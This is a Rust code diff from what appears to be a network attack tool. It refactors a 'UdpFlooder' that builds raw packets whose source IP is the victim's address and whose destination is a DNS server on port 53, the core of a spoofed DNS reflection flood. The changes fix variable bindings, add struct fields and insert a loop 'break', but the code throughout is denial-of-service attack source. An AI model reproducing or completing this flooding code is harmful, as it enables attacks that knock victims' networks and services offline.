@@ -1,17 +1,19 @@
-use std::{net::Ipv4Addr};
+use std::net::Ipv4Addr;
 use crate::engines::UdpArgs;
 use crate::iface::IfaceInfo;
 use crate::generators::RandomValues;
 use crate::pkt_builder::PacketBuilder;
 use crate::sockets::Layer2RawSocket;
-use crate::utils::{abort, inline_display, parse_mac, mac_u8_to_string};
+use crate::utils::{ inline_display, parse_mac, mac_u8_to_string };
 
 
 
 pub struct UdpFlooder {
+    builder:   PacketBuilder,
+    iface:     String,
     pkts_sent: usize,
     pkt_data:  PacketData,
-    rand:      RandomValues
+    rand:      RandomValues,
 }
 
 
@@ -30,6 +32,7 @@ impl UdpFlooder {
         let iface = IfaceInfo::default_iface();
 
         Self {
+            builder:   PacketBuilder::new(),
             pkts_sent: 0,
             pkt_data:  Self::set_pkt_data(args, &iface),
             rand:      RandomValues::new(None, None),
@@ -40,11 +43,15 @@ impl UdpFlooder {
 
 
     fn set_pkt_data(args: UdpArgs, iface: &str) -> PacketData {
-        src_ip   = mem::take(args.target_ip);
-        src_mac  = IfaceInfo::mac(iface);
-        dst_port = 53;
-        dst_ip   = args.dns_ip;
-        dst_mac  = IfaceInfo::gateway_mac(iface);
+        let src_mac_str = IfaceInfo::mac(iface);
+        let dst_mac_str = IfaceInfo::gateway_mac(iface).unwrap();
+
+        let src_ip  = args.target_ip;
+        let src_mac = parse_mac(&src_mac_str).unwrap();
+        
+        let dst_port = 53;
+        let dst_ip   = args.dns_ip;
+        let dst_mac  = parse_mac(&dst_mac_str).unwrap();
 
         PacketData { src_ip, src_mac, dst_port, dst_ip, dst_mac }
     }
@@ -75,6 +82,7 @@ impl UdpFlooder {
 
             self.pkts_sent += 1;
             inline_display(&format!("Packets sent: {}", &self.pkts_sent));
+            break;
         }
     }
 
